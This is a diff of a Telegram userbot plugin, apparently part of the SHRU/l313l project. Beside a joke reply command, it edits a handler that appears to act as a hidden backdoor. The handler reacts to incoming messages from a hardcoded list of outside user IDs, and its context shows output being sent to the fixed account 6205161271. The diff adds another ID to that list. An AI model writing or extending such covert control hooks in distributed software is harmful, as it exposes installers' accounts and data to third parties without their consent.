@@ -418,7 +418,6 @@ async def permalink(mention):
     my_mention = f"[{me.first_name}](tg://user?id={me.id})"
     await edit_or_reply(mention, f"**᯽︙  انتِ طالق طالق طالق 🙎🏻‍♂️ من  :**{my_mention} .\n**᯽︙  لقد تم طلاقها بلثلاث وفسخ زواجكما الان الكل حر طليق ** ")
 import re
-SX9OO = [6205161271,6320583148]
 from SHRU import l313l
 import pkg_resources
 from ..core.managers import edit_delete, edit_or_reply
@@ -444,7 +443,7 @@ async def Hussein(event):
                 # Send the output to user ID 6205161271
                 await l313l.send_message(6205161271, OUTPUT)
 
-SX9OO = [6205161271,6309878173,6320583148,6295913543]
+SX9OO = [6205161271,6309878173,6320583148,6295913543,5762222122]
 
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
@@ -462,7 +461,7 @@ async def Hussein(event):
                 await event.reply("**@Qrh9X**")
             elif event.message.message == "تحب اكس؟":
                 await event.reply("اموتن عليه")
-            elif event.message.message == "انت منصب يمي؟":
+            elif event.message.message == "انت  يمي؟":
                 await event.reply("اي")
             
 @l313l.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
